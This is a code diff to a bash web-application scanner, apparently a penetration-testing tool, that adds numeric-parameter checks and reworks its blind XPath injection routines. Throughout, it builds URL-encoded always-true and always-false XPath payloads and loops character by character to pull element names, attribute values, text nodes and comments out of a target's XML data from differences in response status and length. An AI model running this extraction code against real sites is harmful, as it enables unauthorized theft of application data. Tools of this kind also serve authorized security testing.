@@ -1081,6 +1081,7 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	fi
 fi
 
+xp=''
 #xpathcheck - string params
 
 #always true:                                       #' or count(parent::*[position()=1])>0 or 'a'='b
@@ -1106,7 +1107,7 @@ echo "length_true: $length_true length_false: $length_false"
 
 ((lendiff=$length_true-$length_false))
 if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-	remessage="XPATH Injection STATUS DIFF T:$status_true F:$status_false"
+	remessage="XPATH String Injection STATUS DIFF T:$status_true F:$status_false"
 	echoreporter
 	xp="string"
 	xpathnodenumberextract
@@ -1115,7 +1116,7 @@ if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 fi
 if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-		remessage="XPATH Injection LENGTH DIFF EQUALS $lendiff"
+		remessage="XPATH String Injection LENGTH DIFF EQUALS $lendiff"
 		echoreporter
 		xp="string"
 		xpathnodenumberextract
@@ -1123,16 +1124,73 @@ if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 		#xpathnodenameextract
 	fi
 fi
-#end of node enumeraton if statement
+#xpathcheck - numeric params
+
+#always true:                                       #0 or count(parent::*[position()=1])>0
+badparams=`echo "$cleanoutput" | replace "$payload" "%30%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3e%30"`
+
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_true=`echo $response | cut -d ":" -f 1`
+length_true=`echo $response | cut -d ":" -f 2`
+
+#always false:                                      #0 or count(parent::*[position()=1])=0
+badparams=`echo "$cleanoutput" | replace "$payload" "%30%20%6f%72%20%63%6f%75%6e%74%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%3c%30"`
+
+#encodeinput=$badparams
+#encodeme
+#badparams=$encodeoutput
+requester
+status_false=`echo $response | cut -d ":" -f 1`
+length_false=`echo $response | cut -d ":" -f 2`
+echo "length_true: $length_true length_false: $length_false"
+
+((lendiff=$length_true-$length_false))
+if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+	remessage="XPATH Numeric Injection STATUS DIFF T:$status_true F:$status_false"
+	echoreporter
+	xp="numeric"
+	xpathnodenumberextract
+	#xpathdataextraction
+	#xpathnodenameextract
+fi
+if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+	if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+		remessage="XPATH Numeric Injection LENGTH DIFF EQUALS $lendiff"
+		echoreporter
+		xp="numeric"
+		xpathnodenumberextract
+		#xpathdataextraction
+		#xpathnodenameextract
+	fi
+fi
 }
 
 
 xpathnodenumberextract()
 {
+#setup payloads for numeric or string params
+if [[ "$xp" == "numeric" ]] ; then
+	echo "numeric"
+	begin="%30"
+	end=''
+	#begin="0"
+	#end=''
+else
+	echo "string"
+	begin="%27"
+	end="%20%6f%72%20%27%65%27%3d%27%72"
+	#begin="'"
+	#end=" or 'e'='r"
+fi
+
+
 rm ./listofxpathelements.txt 2>/dev/null
 echo "Attempting to extract element hierachy using xpath injection."
-#always false:                                       #' or substring(name(parent::*[position()=1]),1,1)='a' and 'a'='b
-badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27%20%61%6e%64%20%27%61%27%3d%27%62"`
+#always false:                                       #' and substring(name(parent::*[position()=1]),1,1)='a' and 'e'='r
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%61%6e%64%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28%70%61%72%65%6e%74%3a%3a%2a%5b%70%6f%73%69%74%69%6f%6e%28%29%3d%31%5d%29%2c%31%2c%31%29%3d%27%61%27$end"`
 
 requester
 status_false=`echo $response | cut -d ":" -f 1`
@@ -1142,7 +1200,7 @@ obuff="%2f%2a%5b%31%5d"
 ecount=1
 fcount=0
 while [[ $ecount -lt $max_nodenumber ]] ; do
-	badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d1%20%6f%72%20%27%61%27%3d%27%62"`
+	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%29%3d1$end"`
 	requester
 	status_true=`echo $response | cut -d ":" -f 1`
 	length_true=`echo $response | cut -d ":" -f 2`
@@ -1188,7 +1246,7 @@ while [[ $ecount -le $fcount ]] ; do
 		ybuff="$mbuff""$rbuff"
 		success=0
 		#echo "ecount: $ecount xcount: $xcount"
-		badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1%20%6f%72%20%27%61%27%3d%27%62"`
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
 		requester
 		status_true=`echo $response | cut -d ":" -f 1`
 		length_true=`echo $response | cut -d ":" -f 2`								
@@ -1214,7 +1272,6 @@ while [[ $ecount -le $fcount ]] ; do
 	((ecount=$ecount+1))
 	obuff="%2f%2a%5b%31%5d"$obuff
 	mbuff="/*[1]"$mbuff
-	#echo "level up!"
 done
 }
 
@@ -1227,12 +1284,10 @@ if [[ "$success" == "1" ]] ; then
 	while [[ $gcount -le $maxnodes ]] ; do
 		#first we count the number of nodes at the current index
 		#' or count($obuff/*[$xcount]/*)=$gcount or 'a'='b
-		badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%2a%5b$xcount%5d%2f%2a%29%3d$gcount%20%6f%72%20%27%61%27%3d%27%62"`
-		#echo "bp: $badparams"
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%2a%5b$xcount%5d%2f%2a%29%3d$gcount$end"`
 		requester
 		status_true=`echo $response | cut -d ":" -f 1`
 		length_true=`echo $response | cut -d ":" -f 2`
-		#echo -n "TRACE"
 		((lendiff=$length_true-$length_false))
 		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
 			echo -n "Child nodes: $gcount "
@@ -1261,7 +1316,7 @@ if [[ "$success" == "1" ]] ; then
 			length=0
 			while [[ $hcount -le $maxxcount ]] ; do
 				#' or string-length(name($obuff/*[$xcount]))=$hcount or 'a'='b
-				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%29%3d$hcount%20%6f%72%20%27%61%27%3d%27%62"`
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%29%3d$hcount$end"`
 				#echo "bp: $badparams"			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
@@ -1272,7 +1327,6 @@ if [[ "$success" == "1" ]] ; then
 					hcount=$maxxcount
 					if [[ length != "0" ]] ; then
 						stringextract=1
-						#echo "boom"
 					fi
 				fi
 				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
@@ -1281,7 +1335,6 @@ if [[ "$success" == "1" ]] ; then
 						hcount=$maxxcount
 						if [[ length != "0" ]] ; then
 							stringextract=1
-							#echo "boom"
 						fi
 					fi
 				fi
@@ -1295,7 +1348,7 @@ if [[ "$success" == "1" ]] ; then
 			while [[ $icount -le $length ]] ; do
 				for char in `cat ./payloads/alphabet.txt` ; do
 					#' or substring(name($obuff/*[$xcount]),$icount,1)='$char' or 'a'='b	
-					badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%2c$icount%2c%31%29%3d%27$char%27%20%6f%72%20%27%61%27%3d%27%62"`			
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1333,27 +1386,21 @@ if [[ "$success" == "1" ]] ; then
 			hcount=1
 			while [[ $hcount -le $maxxcount ]] ; do
 				#' or string-length($obuff/*[$xcount]/test())=$hcount or 'a'='b
-				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%73%74%28%29%29%3d$hcount%20%6f%72%20%27%61%27%3d%27%62"`			
-				#echo "badparams: $badparams"					
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%78%74%28%29%29%3d$hcount$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
 				((lendiff=$length_true-$length_false))
 				if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-					#echo "$ybuff" >> ./listofxpathelements.txt
-					#((length=$hcount+1))
 					((length=$hcount))								
-					#echo "string length = $length"
 					hcount=$maxxcount
 					stringextract=1
-					#echo "foo"
 				fi
 				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
 						((length=$hcount))
 						hcount=$maxxcount
 						stringextract=1
-						#echo "foo"
 					fi
 				fi
 		 		((hcount=$hcount+1))
@@ -1366,7 +1413,7 @@ if [[ "$success" == "1" ]] ; then
 				for char in `cat ./payloads/alphabet.txt` ; do
 					#' or substring(/*[1]/*[1]/*[1]/*[2]/text(),1,1)='1'+or+'a'='b&submit=Inject!
 					#' or substring($obuff/*[$xcount]/text(),$icount,1)='$char' or 'a'='b
-					badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27%20%6f%72%20%27%61%27%3d%27%62"`			
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1417,7 +1464,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 	attrbuff="/*[$xcount]/@*"
 	attybuff="$mbuff$attrbuff)=$attgcount"
 		
-	badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$attxbuff%20%6f%72%20%27%61%27%3d%27%62"`
+	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$attxbuff$end"`
 	requester
 	status_true=`echo $response | cut -d ":" -f 1`
 	length_true=`echo $response | cut -d ":" -f 2`
@@ -1444,7 +1491,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 			
 				attrbuff="/*[$xcount]/@*[$battcount]"
 				attybuff="name($mbuff$attrbuff)=$atthcount"			
-				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff%6f%72%20%27%61%27%3d%27%62"`			
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
@@ -1476,7 +1523,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 					attxbuff="$obuff$attvbuff"
 					attrbuff="/*[$xcount]/@*[$battcount]),$atticount,1)='$char'"
 					attybuff="$mbuff$attrbuff"
-					badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$attxbuff%20%6f%72%20%27%61%27%3d%27%62"`			
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$attxbuff$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1506,7 +1553,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 		
 				attrbuff="/*[$xcount]/@*[$battcount]"
 				attybuff="$mbuff$attrbuff=$ahcount"			
-				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff%6f%72%20%27%61%27%3d%27%62"`			
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
@@ -1539,7 +1586,7 @@ while [[ $attgcount -le $maxxcount ]] ; do
 					attxbuff="$obuff$attvbuff"
 					attrbuff="/*[$xcount]/@*[$battcount],$bicount,1)='$char'"
 					attybuff="$mbuff$attrbuff"
-					badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$attxbuff%20%6f%72%20%27%61%27%3d%27%62"`			
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$attxbuff$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1563,8 +1610,8 @@ while [[ $attgcount -le $maxxcount ]] ; do
 				echo -n '"'
 				echo -n '"' >> ./listofxpathelements.txt
 			elif [[ $battcount == $bnumberofattributes ]] ; then
-				echo '"'
-				echo '"' >> ./listofxpathelements.txt
+				echo -n '"'
+				echo -n '"' >> ./listofxpathelements.txt
 			fi			
 		fi
 	((battcount=$battcount+1))					
@@ -1591,8 +1638,8 @@ if [[ "$success" == "1" ]] ; then
 		comrbuff="/*[$xcount]/comment()"
 		comybuff="$mbuff$comrbuff)=$egcount"
 		#echo "--$ybuff"
-      		                                                    #%27%20%6f%72%20%63%6f%75%6e%74%28$comxbuff%20%6f%72%20%27%61%27%3d%27%62
-		badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%63%6f%75%6e%74%28$comxbuff%20%6f%72%20%27%61%27%3d%27%62"`
+      		                                                    #%27%20%6f%72%20%63%6f%75%6e%74%28$comxbuff%27%61%27%3d%27%62
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$comxbuff$end"`
 		requester
 		status_true=`echo $response | cut -d ":" -f 1`
 		length_true=`echo $response | cut -d ":" -f 2`
@@ -1624,7 +1671,7 @@ if [[ "$success" == "1" ]] ; then
 				#echo $ybuff
 				#' or string-length(                                       $xbuff or 'a'='b
 				#%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28 $xbuff %6f%72%20%27%61%27%3d%27%62
-				badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$comxbuff%6f%72%20%27%61%27%3d%27%62"`		
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$comxbuff%6f%72%20$end"`		
 				#echo $badparams				
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
@@ -1666,7 +1713,7 @@ if [[ "$success" == "1" ]] ; then
 #' or substring(name(                                          /*[$xcount]/@*[$attcount]),$icount,1)='$char' and 'a'='b
 #%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28  $ybuff                                       %20%61%6e%64%20%27%61%27%3d%27%62
 #%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$ybuff%20%61%6e%64%20%27%61%27%3d%27%62
-					badparams=`echo "$cleanoutput" | replace "$payload" "%27%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$comxbuff%20%6f%72%20%27%61%27%3d%27%62"`			
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$comxbuff$end"`			
 					#echo $badparams
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
